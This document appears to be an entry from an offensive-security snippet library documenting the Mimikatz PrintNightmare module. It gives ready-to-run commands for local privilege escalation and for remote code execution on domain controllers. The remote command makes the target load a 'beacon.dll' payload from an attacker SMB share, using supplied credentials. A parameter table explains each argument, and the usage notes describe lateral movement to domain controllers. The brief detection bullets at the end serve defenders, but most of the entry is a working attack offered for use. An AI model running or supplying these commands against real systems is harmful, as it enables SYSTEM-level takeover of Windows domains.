---
id: 85108195-0c69-4844-aea9-6ff37aa28d4c
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:02.971461+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - rce
  - printnightmare
validated: true
---

# Mimikatz-PrintNightmare-Module-Usage

## Code

```powershell
## LPE
misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
## RCE
misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
```

## Description

Mimikatz misc::printnightmare module snippets for LPE (local DLL load) and RCE (remote with auth), exploiting Print Spooler for SYSTEM code execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /server | Target server name | DC01 or CASTLE |
| /library | Local or UNC DLL path | C:\...\mimispool.dll or \\...\beacon.dll |
| /authdomain | Domain for RCE | LAB |
| /authuser | Username | Username |
| /authpassword | Password | Password01 |
| /try | Retry count | 50 |

## Usage

Run within Mimikatz session on target or remote. LPE for local escalation; RCE for lateral to DCs. Integrates with [[procedures/Exploit-PrintNightmare-for-SYSTEM-Shell-on-Domain-Controller]]; prepare DLL payload first.

## Detection

- Mimikatz process detection (YARA rules).
- Spooler RPC anomalies (ETW logging).
- Failed auth attempts in security logs (EID 4625).
